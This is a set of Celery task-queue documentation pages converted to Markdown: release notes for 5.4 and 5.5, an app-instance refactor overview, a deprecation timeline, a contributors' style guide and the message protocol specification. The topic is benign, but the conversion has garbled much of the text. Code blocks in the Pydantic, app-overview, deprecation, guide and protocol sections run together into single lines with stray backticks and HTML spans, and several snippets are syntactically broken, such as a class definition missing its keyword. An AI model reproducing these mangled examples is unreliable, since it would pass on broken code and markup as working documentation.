You can use tools like [2to3](https://docs.python.org/3.8/library/2to3.html) and [pyupgrade](https://github.com/asottile/pyupgrade) to assist you with this effort.

After the migration is done, run your test suite with Celery 4 to ensure nothing has been broken.

### Step 5: Upgrade to Celery 5.4

At this point you can upgrade your workers and clients with the new version.

## Important Notes

### Supported Python Versions

The supported Python versions are:

  - CPython 3.8
  - CPython 3.9
  - CPython 3.10
  - PyPy3.8 7.3.11 (`pypy3`)

#### Experimental support

Celery supports these Python versions provisionally as they are not production ready yet:

  - CPython 3.11

### Quality Improvements and Stability Enhancements

Celery 5.4 focuses on elevating the overall quality and stability of the project. We have dedicated significant efforts to address various bugs, enhance performance, and make improvements based on valuable user feedback.

### Better Compatibility and Upgrade Confidence

Our goal with Celery 5.4 is to instill confidence in users who are currently using Celery 4 or older versions. We want to assure you that upgrading to Celery 5.4 will provide a more robust and reliable experience.

### Dropped support for Python 3.7

Celery now requires Python 3.8 and above.

Python 3.7 will reach EOL in June, 2023. In order to focus our efforts we have dropped support for Python 3.6 in this version.

If you still require to run Celery using Python 3.7 you can still use Celery 5.2. However we encourage you to upgrade to a supported Python version since no further security patches will be applied for Python 3.7 after the 23th of June, 2023.

### Kombu

Starting from v5.4.0, the minimum required version is Kombu 5.3.

### Redis

redis-py 4.5.x is the new minimum required version.

### SQLAlchemy

SQLAlchemy 1.4.x & 2.0.x is now supported in celery v5.4

### Billiard

Minimum required version is now 4.1.0

### Deprecate pytz and use zoneinfo

A switch have been made to zoneinfo for handling timezone data instead of pytz.

### Django

Minimum django version is bumped to v2.2.28. Also added --skip-checks flag to bypass django core checks.

---

whatsnew-5.5.md

---

# What's new in Celery 5.5 (Immunity)

  - Author  
    Tomer Nosrati (`tomer.nosrati at gmail.com`).

<div class="sidebar">

**Change history**

What's new documents describe the changes in major versions, we also have a \[changelog\](\#changelog) that lists the changes in bugfix releases (0.0.x), while older series are archived under the \[history\](\#history) section.

</div>

Celery is a simple, flexible, and reliable distributed programming framework to process vast amounts of messages, while providing operations with the tools required to maintain a distributed system with python.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

\> **Note** \> Following the problems with Freenode, we migrated our IRC channel to Libera Chat as most projects did. You can also join us using [Gitter](https://gitter.im/celery/celery).

> We're sometimes there to answer questions. We welcome you to join.

To read more about Celery you should go read the \[introduction \<intro\>\](\#introduction-\<intro\>).

While this version is **mostly** backward compatible with previous versions it's important that you read the following section as this release is a new major version.

This version is officially supported on CPython 3.8, 3.9, 3.10, 3.11, 3.12 and 3.13. and is also supported on PyPy3.10+.

<div class="topic">

**Table of Contents**

Make sure you read the important notes before upgrading to this version.

</div>

<div class="contents" data-local="" data-depth="3">

</div>

## Preface

\> **Note** \> **This release contains fixes for many long standing bugs & stability issues. We encourage our users to upgrade to this release as soon as possible.**

The 5.5.0 release is a new feature release for Celery.

Releases in the 5.x series are codenamed after songs of [Jon Hopkins](https://en.wikipedia.org/wiki/Jon_Hopkins). This release has been codenamed [Immunity](https://www.youtube.com/watch?v=Y8eQR5DMous).

From now on we only support Python 3.8 and above. We will maintain compatibility with Python 3.8 until it's EOL in 2024.

*— Tomer Nosrati*

### Long Term Support Policy

We no longer support Celery 4.x as we don't have the resources to do so. If you'd like to help us, all contributions are welcome.

Celery 5.x **is not** an LTS release. We will support it until the release of Celery 6.x.

We're in the process of defining our Long Term Support policy. Watch the next "What's New" document for updates.

## Upgrading from Celery 4.x

### Step 1: Adjust your command line invocation

Celery 5.0 introduces a new CLI implementation which isn't completely backwards compatible.

The global options can no longer be positioned after the sub-command. Instead, they must be positioned as an option for the <span class="title-ref">celery</span> command like so:

    celery --app path.to.app worker

If you were using our \[daemonizing\](\#daemonizing) guide to deploy Celery in production, you should revisit it for updates.

### Step 2: Update your configuration with the new setting names

If you haven't already updated your configuration when you migrated to Celery 4.0, please do so now.

We elected to extend the deprecation period until 6.0 since we did not loudly warn about using these deprecated settings.

Please refer to the \[migration guide \<conf-old-settings-map\>\](\#migration-guide-\<conf-old-settings-map\>) for instructions.

### Step 3: Read the important notes in this document

Make sure you are not affected by any of the important upgrade notes mentioned in the \[following section \<v550-important\>\](\#following-section-\<v550-important\>).

You should verify that none of the breaking changes in the CLI do not affect you. Please refer to \[New Command Line Interface \<new\_command\_line\_interface\>\](\#new-command-line-interface-\<new\_command\_line\_interface\>) for details.

### Step 4: Migrate your code to Python 3

Celery 5.x only supports Python 3. Therefore, you must ensure your code is compatible with Python 3.

If you haven't ported your code to Python 3, you must do so before upgrading.

You can use tools like [2to3](https://docs.python.org/3.8/library/2to3.html) and [pyupgrade](https://github.com/asottile/pyupgrade) to assist you with this effort.

After the migration is done, run your test suite with Celery 5 to ensure nothing has been broken.

### Step 5: Upgrade to Celery 5.5

At this point you can upgrade your workers and clients with the new version.

## Important Notes

### Supported Python Versions

The supported Python versions are:

  - CPython 3.8
  - CPython 3.9
  - CPython 3.10
  - CPython 3.11
  - CPython 3.12
  - CPython 3.13
  - PyPy3.10 (`pypy3`)

### Python 3.8 Support

Python 3.8 will reach EOL in October, 2024.

Celery v5.5 will be the last version to support Python 3.8.

### Minimum Dependencies

#### Kombu

Starting from Celery v5.5, the minimum required version is Kombu 5.4.

#### Redis

redis-py 4.5.2 is the new minimum required version.

#### SQLAlchemy

SQLAlchemy 1.4.x & 2.0.x is now supported in Celery v5.5.

#### Billiard

Minimum required version is now 4.2.1.

#### Django

Minimum django version is bumped to v2.2.28. Also added --skip-checks flag to bypass django core checks.

## News

### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to `True`. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

### Pydantic Support

This release introduces support for Pydantic models in Celery tasks by @mathiasertl:

`` `bash     pip install "celery[pydantic]"  You can use `Pydantic <https://docs.pydantic.dev/>`_ to validate and convert arguments as well as serializing ``<span class="title-ref"> results based on typehints by passing </span><span class="title-ref">pydantic=True</span>\`. For example:

`` `python     from pydantic import BaseModel      class ArgModel(BaseModel):         value: int      class ReturnModel(BaseModel):         value: str      @app.task(pydantic=True)     def x(arg: ArgModel) -> ReturnModel:         # args/kwargs type hinted as Pydantic model will be converted         assert isinstance(arg, ArgModel)          # The returned model will be converted to a dict automatically         return ReturnModel(value=f"example: {arg.value}")  The task can then be called using a dict matching the model, and you'll receive ``<span class="title-ref"> the returned model "dumped" (serialized using </span><span class="title-ref">BaseModel.model\_dump()</span>\`):

`` `python    >>> result = x.delay({'value': 1})    >>> result.get(timeout=1)    {'value': 'example: 1'}  There are a few more options influencing Pydantic behavior:  .. attribute:: Task.pydantic_strict     By default, `strict mode <https://docs.pydantic.dev/dev/concepts/strict_mode/>`_    is enabled. You can pass ``False``to disable strict model validation.  .. attribute:: Task.pydantic_context     Pass `additional validation context    <https://docs.pydantic.dev/dev/concepts/validators/#validation-context>`_ during    Pydantic model validation. The context already includes the application object as``celery\_app`and the task name as`celery\_task\_name`by default.  .. attribute:: Task.pydantic_dump_kwargs     When serializing a result, pass these additional arguments to`dump\_kwargs()`.    By default, only`mode='json'`is passed.  Quorum Queues Initial Support`\` -----------------------------

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

### REMAP\_SIGTERM

The REMAP\_SIGTERM "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using TERM instead of QUIT.

---

index.md

---

# Celery - Distributed Task Queue

Celery is a simple, flexible, and reliable distributed system to process vast amounts of messages, while providing operations with the tools required to maintain such a system.

It's a task queue with focus on real-time processing, while also supporting task scheduling.

Celery has a large and diverse community of users and contributors, you should come join us \[on IRC \<irc-channel\>\](\#on-irc-\<irc-channel\>) or \[our mailing-list \<mailing-list\>\](\#our-mailing-list-\<mailing-list\>).

Celery is Open Source and licensed under the [BSD License](http://www.opensource.org/licenses/BSD-3-Clause).

## Donations

This project relies on your generous donations.

If you are using Celery to create a commercial product, please consider becoming our [backer](https://opencollective.com/celery#backer) or our [sponsor](https://opencollective.com/celery#sponsor) to ensure Celery's future.

## Getting Started

  - If you're new to Celery you can get started by following the \[first-steps\](\#first-steps) tutorial.
  - You can also check out the \[FAQ \<faq\>\](\#faq-\<faq\>).

## Contents

<div class="toctree" data-maxdepth="1">

copyright

</div>

<div class="toctree" data-maxdepth="2">

getting-started/index userguide/index

</div>

<div class="toctree" data-maxdepth="1">

django/index contributing community tutorials/index faq changelog reference/index internals/index history/index glossary

</div>

## Indices and tables

  - \[genindex\](\#genindex)
  - \[modindex\](\#modindex)
  - \[search\](\#search)

---

app-overview.md

---

# "The Big Instance" Refactor

The <span class="title-ref">app</span> branch is a work-in-progress to remove the use of a global configuration in Celery.

Celery can now be instantiated and several instances of Celery may exist in the same process space. Also, large parts can be customized without resorting to monkey patching.

## Examples

Creating a Celery instance:

    >>> from celery import Celery
    >>> app = Celery()
    >>> app.config_from_object('celeryconfig')
    >>> #app.config_from_envvar('CELERY_CONFIG_MODULE')

Creating tasks:

`` `python     @app.task     def add(x, y):         return x + y   Creating custom Task subclasses:  .. code-block:: python      Task = celery.create_task_cls()      class DebugTask(Task):          def on_failure(self, *args, **kwargs):             import pdb             pdb.set_trace()      @app.task(base=DebugTask)     def add(x, y):         return x + y  Starting a worker:  .. code-block:: python      worker = celery.Worker(loglevel='INFO')  Getting access to the configuration:  .. code-block:: python      celery.conf.task_always_eager = True     celery.conf['task_always_eager'] = True   Controlling workers::      >>> celery.control.inspect().active()     >>> celery.control.rate_limit(add.name, '100/m')     >>> celery.control.broadcast('shutdown')     >>> celery.control.discard_all()  Other interesting attributes::      # Establish broker connection.     >>> celery.broker_connection()      # AMQP Specific features.     >>> celery.amqp     >>> celery.amqp.Router     >>> celery.amqp.get_queues()     >>> celery.amqp.get_task_consumer()      # Loader     >>> celery.loader      # Default backend     >>> celery.backend   As you can probably see, this really opens up another ``\` dimension of customization abilities.

## Deprecated

  - `celery.task.ping` `celery.task.PingTask`
    
    Inferior to the ping remote control command. Will be removed in Celery 2.3.

## Aliases (Pending deprecation)

  -   - `celery.execute`
        
          - `.send_task` -\> {`app.send_task`}
          - `.delay_task` -\> *no alternative*

  -   - `celery.log`
        
          - `.get_default_logger` -\> {`app.log.get_default_logger`}
          - `.setup_logger` -\> {`app.log.setup_logger`}
          - `.get_task_logger` -\> {`app.log.get_task_logger`}
          - `.setup_task_logger` -\> {`app.log.setup_task_logger`}
          - `.setup_logging_subsystem` -\> {`app.log.setup_logging_subsystem`}
          - `.redirect_stdouts_to_logger` -\> {`app.log.redirect_stdouts_to_logger`}

  -   - `celery.messaging`
        
          - `.establish_connection` -\> {`app.broker_connection`}
          - `.with_connection` -\> {`app.with_connection`}
          - `.get_consumer_set` -\> {`app.amqp.get_task_consumer`}
          - `.TaskPublisher` -\> {`app.amqp.TaskPublisher`}
          - `.TaskConsumer` -\> {`app.amqp.TaskConsumer`}
          - `.ConsumerSet` -\> {`app.amqp.ConsumerSet`}

  - `celery.conf.*` -\> {`app.conf`}
    
    > **NOTE**: All configuration keys are now named the same as in the configuration. So the key `task_always_eager` is accessed as:
    > 
    >     >>> app.conf.task_always_eager
    > 
    > instead of:
    > 
    >     >>> from celery import conf
    >     >>> conf.always_eager
    > 
    >   - `.get_queues` -\> {`app.amqp.get_queues`}

  -   - `celery.utils.info`
        
          - `.humanize_seconds` -\> `celery.utils.time.humanize_seconds`
          - `.textindent` -\> `celery.utils.textindent`
          - `.get_broker_info` -\> {`app.amqp.get_broker_info`}
          - `.format_broker_info` -\> {`app.amqp.format_broker_info`}
          - `.format_queues` -\> {`app.amqp.format_queues`}

## Default App Usage

To be backward compatible, it must be possible to use all the classes/functions without passing an explicit app instance.

This is achieved by having all app-dependent objects use <span class="title-ref">\~celery.app.default\_app</span> if the app instance is missing.

`` `python     from celery.app import app_or_default      class SomeClass:          def __init__(self, app=None):             self.app = app_or_default(app)  The problem with this approach is that there's a chance ``<span class="title-ref"> that the app instance is lost along the way, and everything seems to be working normally. Testing app instance leaks is hard. The environment variable :envvar:\`CELERY\_TRACE\_APP</span> can be used, when this is enabled <span class="title-ref">celery.app.app\_or\_default</span> will raise an exception whenever it has to go back to the default app instance.

### App Dependency Tree

  -   - {`app`}
        
          - `celery.loaders.base.BaseLoader`
        
          - `celery.backends.base.BaseBackend`
        
          -   - {`app.TaskSet`}
                
                  - `celery.task.sets.TaskSet` (`app.TaskSet`)
        
          -   - \[`app.TaskSetResult`\]
                
                  - `celery.result.TaskSetResult` (`app.TaskSetResult`)

  -   - {`app.AsyncResult`}
        
          - `celery.result.BaseAsyncResult` / `celery.result.AsyncResult`

  -   - `celery.bin.worker.WorkerCommand`
        
          -   - `celery.apps.worker.Worker`
                
                  -   - `celery.worker.WorkerController`
                        
                          -   - `celery.worker.consumer.Consumer`
                                
                                  - `celery.worker.request.Request`
                                
                                  - `celery.events.EventDispatcher`
                                
                                  -   - `celery.worker.control.ControlDispatch`
                                        
                                          - `celery.worker.control.registry.Panel`
                                          - `celery.pidbox.BroadcastPublisher`
                                
                                  - `celery.pidbox.BroadcastConsumer`
                        
                          - `celery.beat.EmbeddedService`

  -   - `celery.bin.events.EvCommand`
        
          -   - `celery.events.snapshot.evcam`
                
                  - `celery.events.snapshot.Polaroid`
                  - `celery.events.EventReceiver`
        
          -   - `celery.events.cursesmon.evtop`
                
                  - `celery.events.EventReceiver`
                  - `celery.events.cursesmon.CursesMonitor`
        
          -   - `celery.events.dumper`
                
                  - `celery.events.EventReceiver`

  - `celery.bin.amqp.AMQPAdmin`

  -   - `celery.bin.beat.BeatCommand`
        
          -   - `celery.apps.beat.Beat`
                
                  -   - `celery.beat.Service`
                        
                          - `celery.beat.Scheduler`

---

deprecation.md

---

# Celery Deprecation Time-line

<div class="contents" data-local="">

</div>

## Removals for version 5.0

### Old Task API

#### Compat Task Modules

  - Module `celery.decorators` will be removed:
    
    > This means you need to change:
    > 
    >   - \`\`\`python  
    >     from celery.decorators import task
    > 
    > Into:
    > 
    > ``` python
    > from celery import task
    > ```

  - Module `celery.task` will be removed
    
    > This means you should change:
    > 
    > ``` python
    > from celery.task import task
    > ```
    > 
    > into:
    > 
    > ``` python
    > from celery import shared_task
    > ```
    > 
    > \-- and:
    > 
    > ``` python
    > from celery import task
    > ```
    > 
    > into:
    > 
    > ``` python
    > from celery import shared_task
    > ```
    > 
    > \-- and:
    > 
    > ``` python
    > from celery.task import Task
    > ```
    > 
    > into:
    > 
    > ``` python
    > from celery import Task
    > ```

Note that the new <span class="title-ref">\~celery.Task</span> class no longer `` ` uses `classmethod` for these methods:      - delay     - apply_async     - retry     - apply     - AsyncResult     - subtask  This also means that you can't call these methods directly on the class, but have to instantiate the task first: ``\`pycon \>\>\> MyTask.delay() \# NO LONGER WORKS

> \>\>\> MyTask().delay() \# WORKS\!

Task attributes `` ` ---------------  The task attributes:  - ``queue`-`exchange`-`exchange\_type`-`routing\_key`-`delivery\_mode`-`priority``is deprecated and must be set by :setting:`task_routes` instead.   Modules to Remove -----------------  -``celery.execute`This module only contains`send\_task``: this must be replaced with   `@send_task` instead.  -``celery.decorators`See [deprecate-compat-task-modules](#deprecate-compat-task-modules)  -`celery.log``Use `@log` instead.  -``celery.messaging``Use `@amqp` instead.  -``celery.registry``Use :mod:`celery.app.registry` instead.  -``celery.task.control``Use `@control` instead.  -``celery.task.schedules``Use :mod:`celery.schedules` instead.  -``celery.task.chords``Use `celery.chord` instead.  Settings --------``BROKER`Settings ~~~~~~~~~~~~~~~~~~~  =====================================  ===================================== **Setting name**                       **Replace with** =====================================  =====================================`BROKER\_HOST`` :setting:`broker_url` ``BROKER\_PORT`` :setting:`broker_url` ``BROKER\_USER`` :setting:`broker_url` ``BROKER\_PASSWORD`` :setting:`broker_url` ``BROKER\_VHOST``:setting:`broker_url` =====================================  =====================================``REDIS`Result Backend Settings ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  =====================================  ===================================== **Setting name**                       **Replace with** =====================================  =====================================`CELERY\_REDIS\_HOST`` :setting:`result_backend` ``CELERY\_REDIS\_PORT`` :setting:`result_backend` ``CELERY\_REDIS\_DB`` :setting:`result_backend` ``CELERY\_REDIS\_PASSWORD`` :setting:`result_backend` ``REDIS\_HOST`` :setting:`result_backend` ``REDIS\_PORT`` :setting:`result_backend` ``REDIS\_DB`` :setting:`result_backend` ``REDIS\_PASSWORD``:setting:`result_backend` =====================================  =====================================   Task_sent signal ----------------  The :signal:`task_sent` signal will be removed in version 4.0. Please use the :signal:`before_task_publish` and :signal:`after_task_publish` signals instead.  Result ------  Apply to: `~celery.result.AsyncResult`, `~celery.result.EagerResult`:  -``Result.wait()`->`Result.get()`-`Result.task\_id()`->`Result.id`-`Result.status`->`Result.state`.  .. _deprecations-v3.1:   Settings ~~~~~~~~  =====================================  ===================================== **Setting name**                       **Replace with** =====================================  =====================================`CELERY\_AMQP\_TASK\_RESULT\_EXPIRES\`<span class="title-ref"> :setting:\`result\_expires</span> ===================================== =====================================

## Removals for version 2.0

  - The following settings will be removed:

| **Setting name**                                                     | **Replace with**                                             |
| -------------------------------------------------------------------- | ------------------------------------------------------------ |
| <span class="title-ref">CELERY\_AMQP\_CONSUMER\_QUEUES</span>        | <span class="title-ref">task\_queues</span>                  |
| <span class="title-ref">CELERY\_AMQP\_CONSUMER\_QUEUES</span>        | <span class="title-ref">task\_queues</span>                  |
| <span class="title-ref">CELERY\_AMQP\_EXCHANGE</span>                | <span class="title-ref">task\_default\_exchange</span>       |
| <span class="title-ref">CELERY\_AMQP\_EXCHANGE\_TYPE</span>          | <span class="title-ref">task\_default\_exchange\_type</span> |
| <span class="title-ref">CELERY\_AMQP\_CONSUMER\_ROUTING\_KEY</span>  | <span class="title-ref">task\_queues</span>                  |
| <span class="title-ref">CELERY\_AMQP\_PUBLISHER\_ROUTING\_KEY</span> | <span class="title-ref">task\_default\_routing\_key</span>   |

  - `CELERY_LOADER` definitions without class name.
    
    > For example,, <span class="title-ref">celery.loaders.default</span>, needs to include the class name: <span class="title-ref">celery.loaders.default.Loader</span>.

  -   - <span class="title-ref">TaskSet.run</span>. Use <span class="title-ref">celery.task.base.TaskSet.apply\_async</span>  
        instead.

---

guide.md

---

# Contributors Guide to the Code

<div class="contents" data-local="">

</div>

## Philosophy

### The API\>RCP Precedence Rule

  - The API is more important than Readability

  - Readability is more important than Convention

  -   - Convention is more important than Performance
        
          - …unless the code is a proven hot-spot.

More important than anything else is the end-user API. Conventions must step aside, and any suffering is always alleviated if the end result is a better API.

## Conventions and Idioms Used

### Classes

#### Naming

  - Follows `8`.
  - Class names must be <span class="title-ref">CamelCase</span>.

\- but not if they're verbs, verbs shall be \`lower\_case\`:

>   - \`\`\`python  
>     \# - test case for a class class TestMyClass(Case): \# BAD pass
>     
>       - class test\_MyClass(Case): \# GOOD  
>         pass
>     
>     \# - test case for a function class TestMyFunction(Case): \# BAD pass
>     
>       - class test\_my\_function(Case): \# GOOD  
>         pass
>     
>     \# - "action" class (verb) class UpdateTwitterStatus: \# BAD pass
>     
>       - class update\_twitter\_status: \# GOOD  
>         pass
> 
> \> **Note**

  - \>  
    Sometimes it makes sense to have a class mask as a function, and there's precedence for this in the Python standard library (e.g., <span class="title-ref">\~contextlib.contextmanager</span>). Celery examples include <span class="title-ref">\~celery.signature</span>, <span class="title-ref">\~celery.chord</span>, `inspect`, <span class="title-ref">\~kombu.utils.functional.promise</span> and more..

<!-- end list -->

  - Factory functions and methods must be <span class="title-ref">CamelCase</span> (excluding verbs):
    
    > 
    > 
    > ``` python
    > class Celery:
    > 
    >     def consumer_factory(self):     # BAD
    >         ...
    > 
    >     def Consumer(self):             # GOOD
    >         ...
    > ```

Default values `` ` ~~~~~~~~~~~~~~  Class attributes serve as default values for the instance, as this means that they can be set by either instantiation or inheritance.  **Example:** ``\`python class Producer: active = True serializer = 'json'

>   - def \_\_init\_\_(self, serializer=None, active=None):  
>     self.serializer = serializer or self.serializer
>     
>     \# must check for None when value can be false-y self.active = active if active is not None else self.active

A subclass can change the default value:

``` python
TaskProducer(Producer):
    serializer = 'pickle'
```

and the value can be set at instantiation:

``` pycon
>>> producer = TaskProducer(serializer='msgpack')
```

Exceptions `` ` ~~~~~~~~~~  Custom exceptions raised by an objects methods and properties should be available as an attribute and documented in the method/property that throw.  This way a user doesn't have to find out where to import the exception from, but rather use ``help(obj)`and access the exception class from the instance directly.  **Example**:`\`python class Empty(Exception): pass

>   - class Queue:  
>     Empty = Empty
>     
>       - def get(self):  
>         """Get the next item from the queue.
>         
>           - raises Queue.Empty  
>             if there are no more items left.
>         
>         """ try: return self.queue.popleft() except IndexError: raise self.Empty()

Composites `` ` ~~~~~~~~~~  Similarly to exceptions, composite classes should be override-able by inheritance and/or instantiation. Common sense can be used when selecting what classes to include, but often it's better to add one too many: predicting what users need to override is hard (this has saved us from many a monkey patch).  **Example**: ``\`python class Worker: Consumer = Consumer

>   - def \_\_init\_\_(self, connection, consumer\_cls=None):  
>     self.Consumer = consumer\_cls or self.Consumer
> 
>   - def do\_work(self):
>     
>       - with self.Consumer(self.connection) as consumer:  
>         self.connection.drain\_events()

Applications vs. "single mode" `` ` ==============================  In the beginning Celery was developed for Django, simply because this enabled us get the project started quickly, while also having a large potential user base.  In Django there's a global settings object, so multiple Django projects can't co-exist in the same process space, this later posed a problem for using Celery with frameworks that don't have this limitation.  Therefore the app concept was introduced. When using apps you use 'celery' objects instead of importing things from Celery sub-modules, this (unfortunately) also means that Celery essentially has two API's.  Here's an example using Celery in single-mode: ``\`python from celery import task from celery.task.control import inspect

> from .models import CeleryStats
> 
> @task def write\_stats\_to\_db(): stats = inspect().stats(timeout=1) for node\_name, reply in stats: CeleryStats.objects.update\_stat(node\_name, stats)

and here's the same using Celery app objects:

``` python
from .celery import celery
from .models import CeleryStats

@app.task
def write_stats_to_db():
    stats = celery.control.inspect().stats(timeout=1)
    for node_name, reply in stats:
        CeleryStats.objects.update_stat(node_name, stats)
```

In the example above the actual application instance is imported `` ` from a module in the project, this module could look something like this: ``\`python from celery import Celery

> app = Celery(broker='amqp://')

Module Overview `` ` ===============  - celery.app      This is the core of Celery: the entry-point for all functionality.  - celery.loaders      Every app must have a loader. The loader decides how configuration     is read; what happens when the worker starts; when a task starts and ends;     and so on.      The loaders included are:          - app              Custom Celery app instances uses this loader by default.          - default              "single-mode" uses this loader by default.      Extension loaders also exist, for example :pypi:`celery-pylons`.  - celery.worker      This is the worker implementation.  - celery.backends      Task result backends live here.  - celery.apps      Major user applications: worker and beat.     The command-line wrappers for these are in celery.bin (see below)  - celery.bin      Command-line applications.     :file:`setup.py` creates setuptools entry-points for these.  - celery.concurrency      Execution pool implementations (prefork, eventlet, gevent, solo, thread).  - celery.db      Database models for the SQLAlchemy database result backend.     (should be moved into :mod:`celery.backends.database`)  - celery.events      Sending and consuming monitoring events, also includes curses monitor,     event dumper and utilities to work with in-memory cluster state.  - celery.execute.trace      How tasks are executed and traced by the worker, and in eager mode.  - celery.security      Security related functionality, currently a serializer using     cryptographic digests.  - celery.task      single-mode interface to creating tasks, and controlling workers.  - t.unit (int distribution)      The unit test suite.  - celery.utils      Utility functions used by the Celery code base.     Much of it is there to be compatible across Python versions.  - celery.contrib      Additional public code that doesn't fit into any other name-space.  Worker overview ===============  * `celery.bin.worker:Worker`     This is the command-line interface to the worker.     Responsibilities:        * Daemonization when :option:`--detach <celery worker --detach>` set,        * dropping privileges when using :option:`--uid <celery worker --uid>`/          :option:`--gid <celery worker --gid>` arguments        * Installs "concurrency patches" (eventlet/gevent monkey patches). ``app.worker\_main(argv)`calls`instantiate('celery.bin.worker:Worker')(app).execute\_from\_commandline(argv)\`\`

  - <span class="title-ref">app.Worker</span> -\> <span class="title-ref">celery.apps.worker:Worker</span>
    
    > Responsibilities:
    > 
    >   - sets up logging and redirects standard outs
    >   - installs signal handlers (<span class="title-ref">TERM</span>/<span class="title-ref">HUP</span>/<span class="title-ref">STOP</span>/<span class="title-ref">USR1</span> (cry)/<span class="title-ref">USR2</span> (rdb))
    >   - prints banner and warnings (e.g., pickle warning)
    >   - handles the `celery worker --purge` argument

  - <span class="title-ref">app.WorkController</span> -\> <span class="title-ref">celery.worker.WorkController</span>
    
    > This is the real worker, built up around bootsteps.

---

index.md

---

# Internals

  - Release  

  - Date  

<div class="toctree" data-maxdepth="2">

guide deprecation worker protocol app-overview reference/index

</div>

---

protocol.md

---

# Message Protocol

<div class="contents" data-local="">

</div>

## Task messages<span id="message-protocol-task"></span>

### Version 2

#### Definition

`` `python     properties = {         'correlation_id': uuid task_id,         'content_type': string mimetype,         'content_encoding': string encoding,          # optional         'reply_to': string queue_or_url,     }     headers = {         'lang': string 'py'         'task': string task,         'id': uuid task_id,         'root_id': uuid root_id,         'parent_id': uuid parent_id,         'group': uuid group_id,          # optional         'meth': string method_name,         'shadow': string alias_name,         'eta': iso8601 ETA,         'expires': iso8601 expires,         'retries': int retries,         'timelimit': (soft, hard),         'argsrepr': str repr(args),         'kwargsrepr': str repr(kwargs),         'origin': str nodename,         'replaced_task_nesting': int     }      body = (         object[] args,         Mapping kwargs,         Mapping embed {             'callbacks': Signature[] callbacks,             'errbacks': Signature[] errbacks,             'chain': Signature[] chain,             'chord': Signature chord_callback,         }     )  Example ``\` \~\~\~\~\~\~\~

This example sends a task message using version 2 of the protocol:

`` `python     # chain: add(add(add(2, 2), 4), 8) == 2 + 2 + 4 + 8      import json     import os     import socket      task_id = uuid()     args = (2, 2)     kwargs = {}     basic_publish(         message=json.dumps((args, kwargs, None)),         application_headers={             'lang': 'py',             'task': 'proj.tasks.add',             'argsrepr': repr(args),             'kwargsrepr': repr(kwargs),             'origin': '@'.join([os.getpid(), socket.gethostname()])         }         properties={             'correlation_id': task_id,             'content_type': 'application/json',             'content_encoding': 'utf-8',         }     )  Changes from version 1 ``\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

  - Protocol version detected by the presence of a `task` message header.

  - Support for multiple languages via the `lang` header.
    
    > Worker may redirect the message to a worker that supports the language.

  - Meta-data moved to headers.
    
    > This means that workers/intermediates can inspect the message and make decisions based on the headers without decoding the payload (that may be language specific, for example serialized by the Python specific pickle serializer).

  - Always UTC
    
    > There's no `utc` flag anymore, so any time information missing timezone will be expected to be in UTC time.

  - Body is only for language specific data.
    
    >   - Python stores args/kwargs and embedded signatures in body.
    >   - If a message uses raw encoding then the raw data will be passed as a single argument to the function.
    >   - Java/C, etc. can use a Thrift/protobuf document as the body

  - `origin` is the name of the node sending the task.

  - Dispatches to actor based on `task`, `meth` headers
    
    > `meth` is unused by Python, but may be used in the future to specify class+method pairs.

  - Chain gains a dedicated field.
    
    > Reducing the chain into a recursive `callbacks` argument causes problems when the recursion limit is exceeded.
    > 
    > This is fixed in the new message protocol by specifying a list of signatures, each task will then pop a task off the list when sending the next message:
    > 
    >   - \`\`\`python  
    >     execute\_task(message) chain = embed\['chain'\] if chain: sig = maybe\_signature(chain.pop()) sig.apply\_async(chain=chain)

  - `correlation_id` replaces `task_id` field.

  - `root_id` and `parent_id` fields helps keep track of work-flows.

  - `shadow` lets you specify a different name for logs, monitors can be used for concepts like tasks that calls a function specified as argument:
    
    > 
    > 
    > ``` python
    > from celery.utils.imports import qualname
    > 
    > class PickleTask(Task):
    > 
    >     def unpack_args(self, fun, args=()):
    >         return fun, args
    > 
    >     def apply_async(self, args, kwargs, **options):
    >         fun, real_args = self.unpack_args(*args)
    >         return super().apply_async(
    >             (fun, real_args, kwargs), shadow=qualname(fun), **options
    >         )
    > 
    > @app.task(base=PickleTask)
    > def call(fun, args, kwargs):
    >     return fun(*args, **kwargs)
    > ```

### Version 1

In version 1 of the protocol all fields are stored in the message body: meaning workers and intermediate consumers must deserialize the payload to read the fields.

#### Message body

  -   - `task`
        
          - <span class="title-ref">string</span>
        
        Name of the task. **required**

  -   - `id`
        
          - <span class="title-ref">string</span>
        
        Unique id of the task (UUID). **required**

  -   - `args`
        
          - <span class="title-ref">list</span>
        
        List of arguments. Will be an empty list if not provided.

  -   - `kwargs`
        
          - <span class="title-ref">dictionary</span>
        
        Dictionary of keyword arguments. Will be an empty dictionary if not provided.

  -   - `retries`
        
          - <span class="title-ref">int</span>
        
        Current number of times this task has been retried. Defaults to <span class="title-ref">0</span> if not specified.

  -   - `eta`
        
          - <span class="title-ref">string</span> (ISO 8601)
        
